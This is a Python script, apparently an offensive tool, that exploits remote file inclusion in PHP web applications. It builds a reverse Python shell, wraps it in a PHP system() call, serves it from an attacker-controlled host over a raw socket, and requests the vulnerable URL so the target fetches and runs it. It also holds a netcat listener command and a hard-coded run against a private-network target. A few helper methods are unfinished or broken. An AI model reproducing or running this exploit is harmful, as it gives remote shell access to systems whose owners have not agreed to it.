#!/usr/bin/env python3
"""
RFI exploiter
"""
import requests, socket, os, threading,time
from shellgen import shellgen
import http.server
import socketserver


class RFIExploiter():
    def __init__(self,url='',host_address='0.0.0.0',host_port=8000):
        self.url = url
        self._rfi_in_url = self._check_rfi_in_url(url)
        self.host_address = host_address
        self.host_port = host_port
        self.payload = ''
        self.lport = 9001
        self.lhost = '127.0.0.1'
        
        
    
    
    # public classes
    def set_url(self,url):
        self.url = url
        
    def exploit(self):
        if self.url != '' and self._rfi_in_url == True:
            
            shell = shellgen()
            print(f"[+] Generating payload to serve it..")
            pload = shell.generate_shell('reverse_python',lport=self.lport,lhost=self.lhost)
            pload = pload.replace("\'","\\'")
            pload = f"<?php system('{pload}'); ?>"
            serve_thread = threading.Thread(target=self._serve_content, args=(pload,))
            serve_thread.start()
            print("[+] Triggering the vulnerability...")
            vuln_url = self._build_url_payload()
            response = requests.get(vuln_url)
            #print(response.status_code)
            # joining the dead thread
            serve_thread.join()
            
            
    def read_custom_payload(self,path):
        if os.path.isfile(path):
            exp_data = ''
            with open(path,'r') as f:
                exp_data = f.read()
            return exp_data
        else:
            print(f'The given file {path} is not exists!')
    # private classes
    def _check_rfi_in_url(self,url):
        if "RFI" in url:
            return True
        else:
            return False
    def _serve_content(self,payload):
        try:
            http_response_string = f"HTTP/1.0 200 OK\nServer: SimpleHTTP/0.6 Python/3.8.5\nDate: Thu, 20 May 2021 12:16:41 GMT\nContent-type: application/octet-stream\nContent-Length: {len(payload)}\nLast-Modified: Thu, 20 May 2021 12:16:17 GMT\n\nPAYLOAD"
            http_response_string = http_response_string.replace('PAYLOAD',payload)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                print(f"[+] Serving payload on {self.host_address}:{str(self.host_port)}")
                s.bind((self.host_address, self.host_port))
                s.listen()
                conn, addr = s.accept()
                data = conn.recv(1024)
                if not data:
                    conn.close()
                    print(f"[x] Error occurred while serving data!")
                conn.send(http_response_string.encode())
                conn.close()
                print(f"[+] Payload hit by the remote server!")
        except Exception as e:
            print(e)
    def _build_url_payload(self):
        if self._rfi_in_url:
            u = f'http://{self.lhost}:{self.host_port}/almafa.php'
            rfi_url = self.url.replace('RFI',u)
            return rfi_url
        else:
            print('The RFI word is not specified in the target URL!')
        
    def _run_listener(self):
        cmd= f"nc -l {self.host_address} -vnp {str(self.lport)}"
        os.system(cmd)
    def _serve_payload(self):
        Handler = http.server.SimpleHTTPRequestHandler
        Handler.path = os.path.join(os.getcwd(),'pload')
        httpd = socketserver.TCPServer(("", PORT), Handler)
        httpd.serve_forever()
    def _generate_payload(self):
        shell = shellgen()
        print(f"[+] Generating payload to serve it..")
        pload = shell.generate_shell('reverse_python',lport=self.lport,lhost=self.lhost)
        with open('almafa.php','w')as f:
            pass
        
        
r = RFIExploiter('http://192.168.60.79/rfi.php?path=RFI')
r.host_port = 8001
r.lhost = '192.168.60.52'
r.lport = 9001
r.exploit()